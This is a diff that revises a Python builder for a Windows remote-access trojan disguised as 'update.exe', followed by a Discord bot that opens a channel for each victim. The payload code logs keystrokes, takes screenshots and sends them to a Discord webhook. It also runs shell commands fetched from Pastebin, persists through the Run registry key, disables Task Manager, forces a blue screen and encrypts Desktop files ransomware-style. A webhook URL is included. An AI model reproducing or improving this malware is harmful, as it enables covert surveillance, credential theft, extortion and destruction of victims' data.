@@ -1,4 +1,4 @@
-pip install requests pillow pynput opencv-python cryptography pywin32 pyinstaller pyperclip pynput
+pip install requests pillow pynput cryptography pywin32 pyinstaller pyperclip discord.py
 
 https://discord.com/api/webhooks/1453461921733939202/NpZz8x6PQZsh9GmJUIpPT4hK12PJEOm8V0y23nRTtBBbvdk_5c4iin076WJK3srQN2Px
 
@@ -11,9 +11,9 @@ import os
 import subprocess
 import shutil
 
-webhook_url = input("Paste your Discord webhook URL here: ").strip()
-command_url = input("Paste your Pastebin raw URL here: ").strip()
-output_name = "system_update.exe"
+webhook_url = input("Discord webhook URL: ").strip()
+command_url = input("Pastebin raw URL (with {}): ").strip()
+output_name = "update.exe"
 
 rat_code = f'''
 import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip
@@ -29,6 +29,8 @@ VICTIM_ID = hashlib.md5((getpass.getuser() + socket.gethostname()).encode()).hex
 KEYLOG_BUFFER = ""
 
 def send(msg="", embed=None, file=None):
+    if msg: msg = f"[{{VICTIM_ID}}] {{msg}}"
+    if embed and "title" in embed: embed["title"] = f"[{{VICTIM_ID}}] {{embed['title']}}"
     data = {{"content": msg}}
     if embed: data["embeds"] = [embed]
     files = {{"file": file}} if file else None
@@ -36,11 +38,9 @@ def send(msg="", embed=None, file=None):
     except: pass
 
 def info():
-    try:
-        ip = requests.get("https://api.ipify.org", timeout=5).text
-    except:
-        ip = "Unknown"
-    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**Victim ID:** {{VICTIM_ID}}\\n**User:** {{getpass.getuser()}}\\n**PC:** {{socket.gethostname()}}\\n**IP:** {{ip}}", "color": 16711680}}
+    try: ip = requests.get("https://api.ipify.org", timeout=5).text
+    except: ip = "Unknown"
+    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**User:** {{getpass.getuser()}}\\n**PC:** {{socket.gethostname()}}\\n**IP:** {{ip}}", "color": 16711680}}
     send(embed=embed)
 
 def anti_vm():
@@ -57,20 +57,16 @@ def elevate():
 def persist():
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "SysUpdate", 0, winreg.REG_SZ, sys.argv[0])
+        winreg.SetValueEx(key, "UpdateCheck", 0, winreg.REG_SZ, sys.argv[0])
         winreg.CloseKey(key)
     except: pass
 
 def on_press(key):
     global KEYLOG_BUFFER
-    try:
-        KEYLOG_BUFFER += key.char
-    except AttributeError:
-        if key == Key.space: KEYLOG_BUFFER += " "
-        elif key == Key.enter: KEYLOG_BUFFER += "\\n"
-        else: KEYLOG_BUFFER += f" [{{key}}] "
+    try: KEYLOG_BUFFER += key.char
+    except: KEYLOG_BUFFER += f" [{{str(key)}}] "
     if len(KEYLOG_BUFFER) > 500:
-        send(f"Keylog {{VICTIM_ID}}:\\n{{KEYLOG_BUFFER[-500:]}}")
+        send(f"Keylog dump:\\n{{KEYLOG_BUFFER}}")
         KEYLOG_BUFFER = ""
 
 def screenshot():
@@ -78,49 +74,53 @@ def screenshot():
     buf = io.BytesIO()
     img.save(buf, format="PNG")
     buf.seek(0)
-    send(f"{{VICTIM_ID}} screenshot", file=("ss.png", buf, "image/png"))
+    send("Screenshot", file=("ss.png", buf, "image/png"))
 
 def lock_pc():
     ctypes.windll.user32.LockWorkStation()
-    send(f"{{VICTIM_ID}} locked.")
+    send("Workstation locked")
 
-def toggle_tm(enable=True):
+def disable_tm():
     try:
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
-        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0 if enable else 1)
-        winreg.CloseKey(key)
-        send(f"Task Manager {{'enabled' if enable else 'disabled'}} on {{VICTIM_ID}}")
+        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+        send("Task Manager disabled")
+    except: pass
+
+def enable_tm():
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
+        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
+        send("Task Manager enabled")
     except: pass
 
 def bsod():
-    send(f"BSOD triggered on {{VICTIM_ID}}")
-    enabled = ctypes.c_bool()
-    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(enabled))
+    send("Triggering BSOD...")
+    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
     ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
 
 def encrypt(path=os.path.expanduser("~\\Desktop")):
     key = Fernet.generate_key()
     f = Fernet(key)
-    send(f"KEY {{VICTIM_ID}}: {{key.decode()}} - SAVE IT")
+    send(f"ENCRYPTION KEY - SAVE IT: {{key.decode()}}")
     count = 0
-    exts = (".docx", ".pdf", ".jpg", ".png", ".txt", ".xlsx")
+    exts = (".docx",".pdf",".jpg",".png",".txt",".xlsx")
     for root, _, files in os.walk(path):
         for file in files:
             if file.lower().endswith(exts):
                 fp = os.path.join(root, file)
                 try:
-                    with open(fp, "rb") as data: encrypted = f.encrypt(data.read())
-                    with open(fp + ".locked", "wb") as out: out.write(encrypted)
+                    with open(fp,"rb") as d: enc = f.encrypt(d.read())
+                    with open(fp+".locked","wb") as o: o.write(enc)
                     os.remove(fp)
                     count += 1
                 except: pass
-    send(f"Encrypted {{count}} files on {{VICTIM_ID}}")
+    send(f"Encrypted {{count}} files")
 
 def shell(cmd):
-    try:
-        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
+    try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
     except Exception as e: out = str(e)
-    send(f"Shell {{VICTIM_ID}}:\\n{{out[:3000]}}")
+    send(f"Shell output:\\n{{out[:3000]}}")
 
 def poll():
     while True:
@@ -131,11 +131,10 @@ def poll():
                 parts = full.split(" ", 1)
                 cmd = parts[0].lower()
                 arg = parts[1] if len(parts) > 1 else ""
-                send(f"Running: {{full}}")
-                if cmd in ["ss", "screenshot"]: screenshot()
+                if cmd in ["ss","screenshot"]: screenshot()
                 elif cmd == "lock": lock_pc()
-                elif cmd == "disabletm": toggle_tm(False)
-                elif cmd == "enabletm": toggle_tm(True)
+                elif cmd == "disabletm": disable_tm()
+                elif cmd == "enabletm": enable_tm()
                 elif cmd == "bsod": bsod()
                 elif cmd == "encrypt": encrypt(arg or None)
                 elif cmd == "shell": shell(arg)
@@ -147,30 +146,69 @@ if __name__ == "__main__":
     elevate()
     persist()
     info()
-    with Listener(on_press=on_press) as listener:
-        threading.Thread(target=poll, daemon=True).start()
-        listener.join()
+    threading.Thread(target=poll, daemon=True).start()
+    with Listener(on_press=on_press) as l:
+        l.join()
 '''
 
-with open("rat.py", "w", encoding="utf-8") as f: 
-    f.write(rat_code)
+with open("rat.py", "w") as f: f.write(rat_code)
 
-print("Building with pynput fix - hold tight...")
+print("Building bulletproof EXE...")
 subprocess.run([
-    "pyinstaller",
-    "--onefile",
-    "--noconsole",
+    "pyinstaller","--onefile","--noconsole",
+    "--collect-all","pynput",
     "--hidden-import=pynput.keyboard._win32",
     "--hidden-import=pynput._util.win32",
-    "--name", output_name,
-    "rat.py"
+    "--name",output_name,"rat.py"
 ])
 
-# Cleanup
 shutil.rmtree("build", ignore_errors=True)
 shutil.rmtree("__pycache__", ignore_errors=True)
 os.remove("rat.py") if os.path.exists("rat.py") else None
 os.remove("rat.spec") if os.path.exists("rat.spec") else None
 
-print(f"Done - pynput error annihilated. EXE at dist\\{output_name}")
-print("Keylogger now buffers and exfils real keystrokes.")
+print(f"EXE ready: dist\\{output_name}")
+
+
+
+
+import discord
+import re
+
+TOKEN = "YOUR_BOT_TOKEN"
+GUILD_ID = 123456789012345678  # Server ID
+LOG_CHANNEL_ID = 987654321098765432  # Channel where webhook posts
+
+intents = discord.Intents.default()
+intents.message_content = True
+bot = discord.Bot(intents=intents)
+
+known = set()
+
+async def make_victim_section(vid):
+    guild = bot.get_guild(GUILD_ID)
+    cat = await guild.create_category(f"Victim-{vid}")
+    channel = await cat.create_text_channel(f"logs-{vid}", overwrites={
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        guild.me: discord.PermissionOverwrite(read_messages=True)
+    })
+    return channel
+
+@bot.event
+async def on_ready():
+    print("Bot watching for bites...")
+
+@bot.event
+async def on_message(msg):
+    if msg.channel.id != LOG_CHANNEL_ID or msg.author.bot:
+        return
+    content = msg.content + "".join([e.description or "" for e in msg.embeds])
+    if "WE GOT A BITE CAPTAIN" in content:
+        match = re.search(r"Victim ID[:\\s]+([a-f0-9]{{8}})", content, re.I) or re.search(r"\[([a-f0-9]{{8}})\]", content)
+        if match and match.group(1) not in known:
+            vid = match.group(1)
+            known.add(vid)
+            channel = await make_victim_section(vid)
+            await msg.reply(f"New victim **{vid}** online! Control room: {channel.mention}")
+
+bot.run(TOKEN)
